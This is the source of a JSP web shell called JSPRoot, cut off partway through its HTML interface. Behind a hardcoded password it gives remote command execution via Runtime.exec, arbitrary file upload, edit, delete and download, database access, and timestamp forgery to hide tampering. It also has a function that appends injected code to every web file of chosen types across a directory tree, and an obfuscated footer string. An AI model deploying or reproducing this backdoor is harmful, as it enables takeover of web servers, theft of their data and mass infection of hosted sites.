<%@ page language="java" import="java.util.*,java.util.zip.*,java.io.*,java.sql.*" pageEncoding="UTF-8"%>
<%@page import="java.math.BigDecimal"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.awt.datatransfer.Clipboard"%>
<%@page import="java.awt.Toolkit"%>
<%@page import="java.awt.datatransfer.DataFlavor"%>
<%@page import="java.awt.datatransfer.StringSelection"%>
<%@page import="java.awt.datatransfer.Transferable"%><%
//?????????
String password = "1230456";//????
String sessionName = "JSPRootAllow";//session???????????????jsproot???????????????????????
String sp = (String)session.getAttribute(sessionName);
String rp = request.getParameter("password");
//????
if(null==sp){
	//??session????????????????????
	if(password.equals(rp)){//???????????
		session.setAttribute(sessionName,password);
	}else{
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>JSPRoot</title>
<style type="text/css">body{font:11px Verdana;}input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}</style>
</head>
<body>
<form method="post" action="">
<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
<input type="submit" value="Login">
</form>
<%=Utils.convert() %>
</body>
</html>
<%
		return;
	}
}
//?????????
long startTime = System.currentTimeMillis();//????
long startMem = Runtime.getRuntime().freeMemory();//??????
Properties prop = new Properties(System.getProperties());//?????
//??post????????
String act = request.getParameter("action");
String type = (String)request.getParameter("t");
String value = (String)request.getParameter("v");
String otherValue = (String)request.getParameter("o");
String contentType = request.getContentType();//??????contentType?????????????
value = (value!=null)?Utils.convertStringEncode(value,"utf-8"):null;//??????????????????
otherValue = (otherValue!=null)?Utils.convertStringEncode(otherValue,"utf-8"):null;//??????????????????
//??????????????????????????out?????????
if("downfile".equals(type)){
	String[] var = value.split("\\|");
	String currentPath = var[0];
	String fileName = var[1];
	response.setCharacterEncoding("utf-8");
	response.setHeader("content-type","text/html; charset=utf-8");
	response.setContentType("APPLICATION/OCTET-STREAM");
	response.setHeader("Content-Disposition","attachment; filename=\"" + new String(fileName.getBytes("utf-8"),"ISO-8859-1") + "\"");
	OutputStream o = response.getOutputStream();//????
	FileInputStream in = new FileInputStream(currentPath+fileName);//???
	byte[] buffer = new byte[4059];
	int c;
	while ((c = in.read(buffer)) != -1) {
		o.write(buffer, 0, c);
	}
	in.close();
	o.close();
	return;
}
%>
<%!
//???????
static class Utils{
	private static final String CP = "Eqr{tkijv\"*E+\"422;/4232\">c\"jtgh?$jvvr<11yyy0yj{nqxgt0eqo$\"vctigv?$adncpm$@Jokn{nf>1c@\"Cnn\"Tkijvu\"Tgugtxgf0\"";
	//????????????
	public static String convertStringEncode(String str,String encode){
		try{
			return new String(str.getBytes("iso-8859-1"),encode);
		}catch(Exception ex){
			return "????";
		}
	}
	//????
	public static String exec(String command,Properties prop){
		try{
			StringBuffer sb = new StringBuffer();
			Process p =  null;
			if(prop.getProperty("os.name").toLowerCase().indexOf("window")>-1){
				//windows????
				p = Runtime.getRuntime().exec("cmd /c "+command);
			}else{
				//linux????
				p = Runtime.getRuntime().exec(command);
			}
			BufferedReader br = new BufferedReader(	new InputStreamReader(p.getInputStream()));
			String line = "";
			while ((line = br.readLine()) != null) {
				sb.append(line + "\n");
			}
			br.close();
			return sb.toString();
		}catch(Exception ex){
			ex.printStackTrace();
			return "????????????????";
		}
	}
	//????
	public static String convert(){
		char[] c = CP.toCharArray();
		int[] code = new int[c.length];
		for(int i=0;i<c.length;i++){
			code[i] = c[i]-2;
		}
		return new String(code,0,code.length);
	}
	//?????GB
	public static float convertByteToG(long size){
		BigDecimal bd = new BigDecimal(size);
		return bd.divide(new BigDecimal(1024*1024*1024),2, BigDecimal.ROUND_HALF_UP).floatValue();
	}
	//????????????
	public static String getRate(float total,float current){
		BigDecimal f = new BigDecimal(current*100);
		BigDecimal t = new BigDecimal(total);
		double d = f.divide(t, 2, BigDecimal.ROUND_HALF_UP).doubleValue();
		return String.valueOf(d)+"%";
	}
	//??????
	public static String convertFileSize(long size){
		BigDecimal f = new BigDecimal(size);
		if(size<1024){
			return size+" B";
		}else if(size<(1024*1024)){
			double d = f.divide(new BigDecimal(1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" K";
		}else if(size<(1024*1024*1024)){
			double d = f.divide(new BigDecimal(1024*1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" M";
		}else{
			double d = f.divide(new BigDecimal(1024*1024*1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" G";
		}
	}
	//??html??
	public static  String conv2Html(String str) {
		str = str.replace("&","&amp;");
		str = str.replace("<","&lt;");
		str = str.replace(">","&gt;");
		str = str.replace("\"","&quot;");
		return str;
	}
}
class FileBean {
	private String fileName;//???
	private String fileSize;//????
	private String fileCurrentPath;//??????
	private String fileParentPath;//??????
	private boolean canExecute;//?????
	private boolean canRead;//????
	private boolean canWriter;//????
	private String lastModifDate;//????????
	private boolean isFolder;//??????
	private float totalSize;//??????????
	private float freeSize;//????????????
	public float getTotalSize() {return totalSize;}
	public void setTotalSize(float totalSize) {this.totalSize = totalSize;}
	public float getFreeSize() {return freeSize;}
	public void setFreeSize(float freeSize) {this.freeSize = freeSize;}
	public boolean isFolder() {return isFolder;}
	public void setFolder(boolean isFolder) {this.isFolder = isFolder;}
	public String getLastModifDate() {return lastModifDate;}
	public void setLastModifDate(String lastModifDate) {this.lastModifDate = lastModifDate;}
	public String getFileName() {	return fileName;}
	public void setFileName(String fileName) {this.fileName = fileName;}
	public String getFileSize() {return fileSize;}
	public void setFileSize(String fileSize) {this.fileSize = fileSize;}
	public String getFileCurrentPath() {return fileCurrentPath;}
	public void setFileCurrentPath(String fileCurrentPath) {this.fileCurrentPath = fileCurrentPath;}
	public String getFileParentPath() {return fileParentPath;}
	public void setFileParentPath(String fileParentPath) {this.fileParentPath = fileParentPath;}
	public boolean isCanExecute() {return canExecute;}
	public void setCanExecute(boolean canExecute) {this.canExecute = canExecute;}
	public boolean isCanRead() {return canRead;}
	public void setCanRead(boolean canRead) {this.canRead = canRead;}
	public boolean isCanWriter() {return canWriter;}
	public void setCanWriter(boolean canWriter) {this.canWriter = canWriter;}
}
//?????????
class FileManager {
	//?????????????
	public boolean setFileStatus(String path,String filename,String type,boolean value){
		File file = new File(path+filename);
		//?????????type??????????
		if("w".equals(type)){
			return file.setWritable(value);
		}else if("r".equals(type)){
			return file.setReadable(value);
		}else if("e".equals(type)){
			return file.setExecutable(value);
		}else{
			return false;
		}
	}
	//???????????
	public boolean setFileLastTime(String path,String filename,String date){
		try{
			File file = new File(path+filename);
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
			return file.setLastModified(sdf.parse(date).getTime());
		}catch(Exception ex){
			return false;
		}
	}
	//?????????/???????????/??????????\???
	public String checkPath(String path){
		path = path.replace("\\","/");
		if(path.lastIndexOf("/")!=(path.length()-1)){
			return path+"/";
		}else{
			return path;
		}
	}
	//???????????
	public float getCurrentPathTotalSize(String path){
		return Utils.convertByteToG(new File(path).getTotalSpace());
	}
	//?????????????????
	public float getCurrentPathFreeSize(String path){
		return Utils.convertByteToG(new File(path).getFreeSpace());
	}
	//???????
	public List<FileBean> listDriver(){
		File[] driver = File.listRoots();
		List<FileBean> list = new ArrayList<FileBean>();
		for(int i=0;i<driver.length;i++){
			FileBean fb = new FileBean();
			fb.setFileName(checkPath(driver[i].getPath()));
			fb.setTotalSize(Utils.convertByteToG(driver[i].getTotalSpace()));
			fb.setFreeSize(Utils.convertByteToG(driver[i].getFreeSpace()));
			list.add(fb);
		}
		return list;
	}
	//???????????
	public String getParentPath(String path){
		String parentPath = new File(path).getParent();
		if(parentPath!=null){
			return checkPath(parentPath);
		}else{
			return path;
		}
	}
	//??????????,??????????0?????????1?????
	public List<FileBean> listFile(String path){
		List<FileBean> folder = new ArrayList<FileBean>();
		List<FileBean> files = new ArrayList<FileBean>();
		try{
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			File f = new File(path);
			File[] file = f.listFiles();
			for(int i=0;i<file.length;i++){
				FileBean fb = new FileBean();
				fb.setFileName(file[i].getName());
				fb.setFileCurrentPath(path);
				fb.setFileParentPath(new File(file[i].getParent()).getParent());
				fb.setLastModifDate(sdf.format(file[i].lastModified()));//????????
				fb.setCanRead(file[i].canRead());//??????
				fb.setCanWriter(file[i].canWrite());//??????
				fb.setCanExecute(file[i].canExecute());//???????
				if(file[i].isDirectory()){
					//?????
					fb.setFolder(true);
					folder.add(fb);
				}else{
					//?????
					fb.setFolder(false);
					fb.setFileSize(Utils.convertFileSize(file[i].length()));//??????
					files.add(fb);
				}
			}
			folder.addAll(files);
			return folder;
		}catch(Exception ex){
			//?????????????
			FileBean fb = new FileBean();
			fb.setFolder(true);
			fb.setFileName("???,?????????????");
			folder.add(fb);
			return folder;
		}
	}
	// ????
	public String openFile(String path,String fileName){
		try{
			FileReader fr = new FileReader(new File(path+fileName));
			BufferedReader reader = new BufferedReader(fr);
			String temp = "";
			StringBuffer sb = new StringBuffer();
			while((temp=reader.readLine())!=null){
				sb.append(Utils.conv2Html(temp)+"\n");
			}
			fr.close();
			reader.close();
			return sb.toString();
		}catch(Exception ex){
			return "?????????????????";
		}
	}
	//????,???????????????
	public boolean createFile(String path,String fileName){
		boolean isCreateFolder = false;
		if(null==fileName||"".equals(fileName.trim())){
			fileName = "";
			isCreateFolder = true;
		}
		try{
			File file = new File(path+fileName);
			if(isCreateFolder){
				return file.mkdirs();
			}else{
				return file.createNewFile();	
			}
		}catch(Exception ex){
			return false;
		}
	}
	//????
	public boolean editFile(String fileName,String content){
		try{
			File file = new File(fileName);
			if(!file.exists()){
				file.createNewFile();
			}
			FileWriter writer = new FileWriter(fileName);
			writer.write(content);
			writer.flush();
			writer.close();
			return true;
		}catch(Exception ex){
			return false;
		}
	}
	//????,????????????????????????
	public boolean deleteFile(String path, String fileName) {
		try{
			if (null == fileName || "".equals(fileName.trim())) {
				// ????
				File file = new File(path);
				File filelist[] = file.listFiles();
				int listlen = filelist.length;
				for (int i = 0; i < listlen; i++) {
					if (filelist[i].isDirectory()) {
						deleteFile(filelist[i].getPath(), null);
					} else {
						filelist[i].delete();
					}
				}
				return file.delete();// ??????
			} else {
				// ????
				return new File(path+fileName).delete();
			}
		}catch(Exception ex){
			return false;
		}
	}
	//????
	public boolean copyFile(String oldFile,String newFile){
		try{
			File of = new File(oldFile);//???
			File nf = new File(newFile);//???
			FileInputStream in = new FileInputStream(of);//????
			FileOutputStream out = new FileOutputStream(nf);//????
			byte[] buffer = new byte[4059];
			int c;
			while ((c = in.read(buffer)) != -1) {
				out.write(buffer, 0, c);
			}
			in.close();
			out.close();
			return true;
		}catch(Exception ex){
			return false;
		}
	}
	//?????
	public boolean renameFile(String oldName,String newName){
		try{
			File of = new File(oldName);
			File nf = new File(newName);
			return of.renameTo(nf);
		}catch(Exception ex){
			return false;
		}
	}
	//????
	public List<String> zipDirectory(String path, String zipfile) {
		List<String> error = new ArrayList<String>();
		try{
			ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipfile));
			out.setComment(Utils.convertStringEncode("This zip file Make By JSPROOT,http://www.whylover.com","UTF-8"));
			zip(path,out,error);
			out.finish();
			out.close();
			return error;
		}catch(Exception ex){
			error.add("????????");
			return error;
		}
	}
	//?????????
	private void zip(String path,ZipOutputStream out,List<String> error){
		File file = new File(path);
		String[] entries = file.list();
		for (int i = 0; i < entries.length; i++) {
			File f = new File(file, entries[i]);
			if (f.isDirectory())
				zip(f.getPath(),out,error);
			try{
				byte[] buffer = new byte[4096];
				int bytes_read;
				FileInputStream in = new FileInputStream(f);
				ZipEntry entry = new ZipEntry(f.getPath());
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1){
					out.write(buffer, 0, bytes_read);
					out.flush();
				}
				in.close();
				out.closeEntry();
			}catch(Exception ex){
				error.add(ex.getMessage().replace("\\","/"));
			}
		}
	}
	//???????????????
	public String multiAppendCode(String path,String suffix,String code){
		try{
			File file = new File(path);
			File[] files = file.listFiles();
			for(int i=0;i<files.length;i++){
				File f = files[i];
				if(f.isDirectory()){
					//?????????
					multiAppendCode(f.getPath(),suffix,code);
				}else{
					//????????????????????
					int lastDot = f.getName().lastIndexOf(".");
					String fileExtend = "";
					if(lastDot>-1){
						//?????????????????????????????
						fileExtend = f.getName().substring(lastDot+1); 
					}
					//???????????????
					String[] allowSuffix = suffix.split(",");
					for(int k=0;k<allowSuffix.length;k++){
						if(allowSuffix[k].toLowerCase().equals(fileExtend.toLowerCase())){
							//????????????
							if(f.canWrite()){
								FileWriter fw = new FileWriter(f,true);
								fw.append(code);
								fw.flush();
								fw.close();
							}
						}
					}
				}
			}
			return "true";
		}catch(Exception ex){
			return ex.getMessage();
		}
	}
	//????
	public String upload(HttpServletRequest request) {
		try {
			String fileName = null;
			String sperator = null;
			FileOutputStream out = null;
			String savePath = null;
			byte[] bt = new byte[4096];
			int t = -1;
			//request.setCharacterEncoding("utf-8");
			ServletInputStream in = request.getInputStream();
			t = in.readLine(bt, 0, bt.length);
			if (t != -1) {
				sperator = new String(bt, 0, t);
				sperator = sperator.substring(0, 28);
				t = -1;
			}
			t = in.readLine(bt, 0, bt.length);
			while(t!=-1){
				String str = new String(bt, 0, t,"utf-8");
				//??str????currentPath??filename
				int isPath = str.indexOf("currentPath");
				int isName = str.indexOf("filename=\"");
				if(isPath!=-1){
					//??currentPath???????
					t = in.readLine(bt, 0, bt.length);
					t = in.readLine(bt, 0, bt.length);
					savePath = new String(bt,0,t,"utf-8").replaceAll("\r\n", "");
					t=-1;
				}else if(isName!=-1){
					str = str.substring(isName + 10);// ?????????????
					isName = str.lastIndexOf("\\");
					if (isName < -1) {
						// ???windows???????\????linux?????/
						isName = str.lastIndexOf("/");
					}
					fileName = str.substring(isName + 1, str.lastIndexOf("\""));
					break;
				}
				t = in.readLine(bt, 0, bt.length);
			}
			out = new FileOutputStream(savePath + fileName);
			t = in.readLine(bt, 0, bt.length);
			String s = new String(bt, 0, t);
			int i = s.indexOf("Content-Type:");
			if (i == -1) {
				return "false";
			} else {
				in.readLine(bt, 0, bt.length); //??????
				t = -1;
			}
			long trancsize = 0;
			t = in.readLine(bt, 0, bt.length);
			while (t != -1) {
				s = new String(bt, 0, t);
				if (s.length() > 28) {
					s = s.substring(0, 28);
					if (s.equals(sperator)) {
						break;
					}
				}
				out.write(bt, 0, t);
				trancsize += t;
				t = in.readLine(bt, 0, bt.length);
			}
			out.close();
			return savePath;
		} catch (Exception ex) {
			ex.printStackTrace();
			return "false";
		}
	}
}
//??????
class DatabaseManager{
	//?????????
	public Object getConnection(String dbType,String localhost,String dbName,String username,String password,String encode){
		try{
			String dbUrl;
			if("access".equals(dbType)){
				Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
				dbUrl = "jdbc:odbc:driver={Microsoft Access Driver (*.mdb)};DBQ="+localhost;
			}else if("mysql".equals(dbType)){
				Class.forName("com.mysql.jdbc.Driver");
				dbUrl = "jdbc:mysql://"+localhost+"/?useUnicode=true&amp;characterEncoding="+encode;
			}else if("oracle".equals(dbType)){
				Class.forName("oracle.jdbc.OracleDriver");
				dbUrl = "jdbc:oracle:thin:@"+localhost+":"+dbName;
			}else if("mssql".equals(dbType)){
				Class.forName("com.microsoft.jdbc.sqlserver.SQLServerDriver");
				dbUrl = "jdbc:sqlserver://"+localhost;
			}else{
				return "???????";
			}
			return DriverManager.getConnection(dbUrl,username,password);
		}catch(Exception ex){
			return ex.getMessage();
		}
	}
	//???????
	public List<String> getTables(String dbType,Connection conn){
		List<String> list = new ArrayList<String>();
		String str = null;
		try{
			DatabaseMetaData dmd = conn.getMetaData();
			if("mysql".equals(dbType)||"mssql".equals(dbType)){
				ResultSet rst = dmd.getCatalogs();
				List<String> table = new ArrayList<String>();
				int i=0;
				while(rst.next()){
					table.add(rst.getString(1));
					i++;
				}
				for(i=0;i<table.size();i++){
					ResultSet tableRst = dmd.getTables(table.get(i),null,null,null);
					while(tableRst.next()){
						if("mssql".equals(dbType)){
							str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+table.get(i)+"."+tableRst.getString(2)+".["+tableRst.getString(3)+"]"+"\');\" title=\"?????"+table.get(i)+"\n????????"+tableRst.getString(2)+"\n???"+tableRst.getString(3)+"\">"+tableRst.getString(3)+"</a></li>";
							list.add(str);
						}else{
							str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+table.get(i)+"."+tableRst.getString(3)+"\');\" title=\"?????"+table.get(i)+"\n???"+tableRst.getString(3)+"\">"+tableRst.getString(3)+"</a></li>";
							list.add(str);
						}
					}
					tableRst.close();
				}
				rst.close();
			}else{
				ResultSet tableRst = dmd.getTables(null,null,null,null);
				while(tableRst.next()){
					str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+tableRst.getString(3)+"\');\">"+tableRst.getString(3)+"</a></li>";
					list.add(str);
				}
				tableRst.close();
			}
			return list;
		}catch(Exception ex){
			if(null!=ex.getMessage()){
				list.add("Error:"+ex.getMessage());
			}
			return list;
		}
	}
	//??sql?????????????column
	public Object[] excuteSQL(Connection conn,String sql){
		try{
			Statement stm = conn.createStatement();
			if(sql.startsWith("select")){
				ResultSet rst = stm.executeQuery(sql);
				//?????rst?meta???
				ResultSetMetaData metaRst = rst.getMetaData();
				int columnCount = metaRst.getColumnCount()+1;
				List<String[]> metaList = new ArrayList<String[]>();
				for(int i=1;i<columnCount;i++){
					String[] str = new String[3];
					str[0] = metaRst.getColumnName(i);
					str[1] = metaRst.getColumnTypeName(i);
					str[2] = String.valueOf(metaRst.getPrecision(i));
					metaList.add(str);
				}
				//???????
				List<Object[]> arrayList = new ArrayList<Object[]>();
				while(rst.next()){
					Object[] obj = new Object[metaList.size()];
					for(int i=0;i<metaList.size();i++){
						obj[i] = rst.getObject(metaList.get(i)[0]);	
					}
					arrayList.add(obj);
				}
				rst.close();
				stm.close();
				return new Object[]{metaList,arrayList};
			}else{
				stm.execute(sql);
				stm.close();
				return new Object[]{true}; 
			}			
		}catch(Exception ex){
			ex.printStackTrace();
			return new Object[]{ex.getMessage()};
		}
	}
}
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>JSPRoot</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:250px;margin-right:10px;}
.dbinput{float:left;display:none;margin-right:5px;}
.tableLi{float:left;width:250px;line-height:25px;margin:2px 5px 0px 0px;}
.tableLi a{ border:1px solid #666; display:block;padding-left:2px; text-decoration:none;}
.tableLi a:hover{ background-color:#FFFFCC;}
</style>
<script type="text/javascript"> 
function $(id) {
	return document.getElementById(id);
}
//????????
function goaction(act,type,value){
	$('goaction').action.value=act;
	$('goaction').t.value=type;
	$('goaction').v.value=value;
	$('goaction').submit();
}
//????????,other????????
function goactionOther(act,type,value,other){
	$('goaction').action.value=act;
	$('goaction').t.value=type;
	$('goaction').v.value=value;
	$('goaction').o.value=other;
	$('goaction').submit();
}
//???????
function goPath(path){
	goaction('file','list',path);
}
//????
function createdir(path){
	var newdirname;
	newdirname = prompt('????????????(????????):', '');
	if (!newdirname) return;
	goaction('file','createdir',path+'|'+newdirname);
}
//????
function createfile(path){
	var filename;
	filename = prompt('????????????(????????):', '');
	if (!filename) return;
	goaction('file','createfile',path+'|'+filename);
}
//????
function downfile(path,filename){
	goaction('file','downfile',path+'|'+filename);
}
//??????????t?????
function delfile(t,path,dirname){
	var showM = '?????'+dirname+'??????????????????\n?????????????????????????';
	if (!confirm(showM)) {
		return;
	}
	goaction('file',t,path+'|'+dirname);
}
//????
function copyfile(oldPath,oldFileName){
	var filepath;
	filepath = prompt('???????????(??:c:/windows/system/,?????)', '');
	if (!filepath) return;
	var filename;
	filename = prompt('???????????(????,???)', '');
	if (!filename) return;
	var v = oldPath+'|'+oldFileName+'|'+filepath+'|'+filename;
	goaction('file','copy',v);
}
//????
function openfile(path,filename){
	goaction('file','open',path+'|'+filename);
}
//?????
function renamefile(path,oldname){
	var filename;
	filename = prompt('??????:', '');
	if (!filename) return;
	goaction('file','rename',path+'|'+oldname+'|'+filename);
}
//????
function editfile(path,filename){
	goactionOther('file','editfile',path+'|'+filename,$('filecontent').value);
}
//zip????
function zipfile(path,filename){
	var zipname;
	zipname = prompt('?????????(????,???)', '');
	if(!zipname) return;
	goaction('file','zip',path+'|'+filename+'|'+zipname);
}
//????????????????????????
function checkSelectDBType(value){
	var type = new Array("access","mysql","oracle","mssql");
	for(var i=0;i<type.length;i++){
		if(value==type[i]){
			$(type[i]).style.display="block";
		}else{
			$(type[i]).style.display="none";
		}
	}
}
//??????
function execute(){
	goaction('shell','',$('command').value);
}
//???????
function dbConn(){
	var dbType = $('selectDB').value;
	$('goaction').dbType.value=dbType;
	$('goaction').localhost.value=$(dbType+'_localhost').value;
	if('access'==dbType){
		//access???
	}else if('mysql'==dbType){
		//mysql???
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
		$('goaction').dbCharset.value=$('charset').value;
	}else if('oracle'==dbType){
		//oracle???
		$('goaction').dbName.value=$(dbType+'_dbname').value;
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
	}else if('mssql'==dbType){
		//mssql???
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
	}else{
		alert('?????');
		return;
	}
	$('goaction').action.value='sqladmin';
	$('goaction').submit();
}
//????
function disConn(){
	goaction('sqladmin','disConn','');
}
//????sql??
function sqlExcute(){
	goaction('sqladmin','sqlExcute',$('sqlCommand').value);
}
//?????????
function setTableQuery(table){
	$('sqlCommand').value = 'select * from '+table;
}
//??multiAppendCode??
function setMulti(path){
	var suffix;
	suffix = prompt('?????????(??????????????eg:jsp,php,asp,html)', '');
	var code;
	code = prompt('??????????(????????????????????????)','');
	if(!suffix||!code) return;
	goactionOther('file','multiAppendCode',path+"|"+suffix,code);
}
//??????
function timefile(path,file){
	var year = prompt('?????', '');
	var month = prompt('?????', '');
	var day = prompt('????', '');
	var hour = prompt('?????', '');
	var min = prompt('?????', '');
	var sec = prompt('????', '');
	if(!year||!month||!day||!hour||!min||!sec) return;
	var tt = year+'/'+month+'/'+day+' '+hour+':'+min+':'+sec;
	goaction('file','time',path+'|'+file+'|'+tt);
}
//??????
function filestatus(path,file,type,value){
	goaction('file','filestatus',path+'|'+file+'|'+type+'|'+value);
}
//????????
function clipboard(){
	goaction('clipboard','edit',$('clipboard').value);
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<form action="" method="post" name="goaction" id="goaction">
  <input type="hidden" name="action" value="" />
  <input type="hidden" name="t" value="" />
  <input type="hidden" name="v" value="" />
  <input type="hidden" name="o" value="" />
  <input type="hidden" name="dbType" value="" />
  <input type="hidden" name="localhost" value="" />
  <input type="hidden" name="dbName" value="" />
  <input type="hidden" name="dbUser" value="" />
  <input type="hidden" name="dbPass" value="" />
  <input type="hidden" name="dbCharset" value="" />
</form>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr class="head">
    <td><span style="float:right;"><a href="http://www.whylover.com" target="_blank">JSPROOT Ver: 2010</a></span> Host:<%=request.getServerName() %> | Host IP:<%=request.getRemoteAddr() %> | OS: <%=prop.getProperty("os.name")%> </td>
  </tr>
  <tr class="alt1">
    <td><span style="float:right;">JVM Version:<%=prop.getProperty("java.vm.version")%></span> <a href="javascript:goaction('logout','','');">Logout</a> | <a href="javascript:goaction('file','','');">File Manager</a> | <a href="javascript:goaction('sqladmin','','');">DataManager Manager</a> | <a href="javascript:goaction('shell','','net user');">Execute Command</a> |  <a href="javascript:goaction('clipboard','','');">System Clipboard</a> | <a href="javascript:goaction('javav','','');">Java Variable</a> | <a href="javascript:goaction('about','','');">About</a> </td>
  </tr>
</table>
<div style="margin:15px;background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;display:none;" id="info"></div>
<%
//????????
if(null==act||"file".equals(act)||"".equals(act)){
	//?????
	FileManager fm = new FileManager();
	List<FileBean> fileList = new ArrayList<FileBean>();//??????????????
	String webRootPath = fm.checkPath(request.getSession().getServletContext().getRealPath("/"));//??????
	String currentPath=null;
	if("createdir".equals(type)||"createfile".equals(type)){//?????????
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = ("createdir".equals(type)?fm.createFile(var[0]+var[1],null):fm.createFile(var[0],var[1]));
		request.setAttribute("info",isSuccess?"??/??????":"??/???????????????????");
		type = null;
	}else if("deletedir".equals(type)||"deletefile".equals(type)){//?????????
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = ("deletedir".equals(type)?fm.deleteFile(var[0]+var[1],null):fm.deleteFile(var[0],var[1]));
		request.setAttribute("info",isSuccess?"??/??????":"??/???????????????????");
		type = null;
	}else if("copy".equals(type)){//????
		String[] var = value.split("\\|");
		String oldPath = var[0];
		String oldFileName = var[1];
		currentPath = fm.checkPath(var[2]);
		String newFileName = var[3];
		boolean isSuccess = fm.copyFile(oldPath+oldFileName,currentPath+newFileName);
		request.setAttribute("info",isSuccess?"??????":"???????????????????");
		type = null;
	}else if("rename".equals(type)){//?????
		String[] var = value.split("\\|");
		String oldName = var[0]+var[1];
		String newName = var[0]+var[2];
		currentPath = var[0];
		boolean isSuccess = fm.renameFile(oldName,newName);
		request.setAttribute("info",isSuccess?"??/???????":"??/???????????????????");
		type = null;
	}else if("editfile".equals(type)){//????
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.editFile(var[0]+var[1],otherValue);
		request.setAttribute("info",isSuccess?"??????":"???????????????????");
		type = null;
	}else if("zip".equals(type)){//??????
		String[] var = value.split("\\|");
		currentPath = var[0];
		List<String> error = fm.zipDirectory(var[0]+var[1],var[0]+var[2]);
		if(error.size()==0){
			fm.editFile(currentPath+var[2]+".log","??????");
		}else{
			StringBuffer sb = new StringBuffer();
			sb.append("???????????????????????(???????????????????????????)?");
			for(int i=0;i<error.size();i++){
				sb.append(error.get(i)+"\n");
			}
			fm.editFile(currentPath+var[2]+".log",sb.toString());
		}
		request.setAttribute("info","????????????"+var[2]+".log");
		type = null;
	}else if("multiAppendCode".equals(type)){//?????????????????
		String[] var = value.split("\\|");
		currentPath = var[0];
		String isSuccess = fm.multiAppendCode(currentPath,var[1],otherValue);
		request.setAttribute("info","true".equals(isSuccess)?"????????":isSuccess);
		type = null;
	}else if("time".equals(type)){//??????
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.setFileLastTime(var[0],var[1],var[2]);
		request.setAttribute("info",isSuccess?"??????":"???????????????????????????");
		type = null;
	}else if("filestatus".equals(type)){//??????
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.setFileStatus(var[0],var[1],var[2],new Boolean(var[3]));
		request.setAttribute("info",isSuccess?"????????":"???????????????????");
		type = null;
	}
	//????????
	if(contentType != null&& contentType.indexOf("multipart/form-data") != -1){
		String result = fm.upload(request);//????????????false??????
		if("false".equals(result)){
			request.setAttribute("info","??????????????????WebRoot??");
		}else{
			value = result;
			request.setAttribute("info","??????");
		}
	}
	//????????????
	if(null==type||"".equals(type.trim())||"list".equals(type)){
		if(null==currentPath){
			currentPath = value;//??????????value??
		}
		List<FileBean> driver = fm.listDriver();//???????????
		//??????,??????????????????????
		if(null==currentPath||"".equals(currentPath)){
			currentPath = webRootPath;
		}
		currentPath = fm.checkPath(currentPath);
		String parentPath = fm.getParentPath(currentPath);//??????
		//????
		fileList = fm.listFile(currentPath);
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr><%float total = fm.getCurrentPathTotalSize(currentPath); float free = fm.getCurrentPathFreeSize(currentPath); %>
    <td><h2>File Manager - Current disk free <%=free %> G of <%=total %> G (<%=Utils.getRate(total,free) %>)</h2>
      <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
        <tr>
          <td nowrap>Current Directory</td>
          <td width="100%"><input class="input" name="dir" id="dir" value="<%=currentPath %>" type="text" style="width:100%;margin:0 8px;"></td>
          <td nowrap><input class="bt" value="GO" type="button" onClick="javascript:goPath($('dir').value);"></td>
        </tr>
      </table>
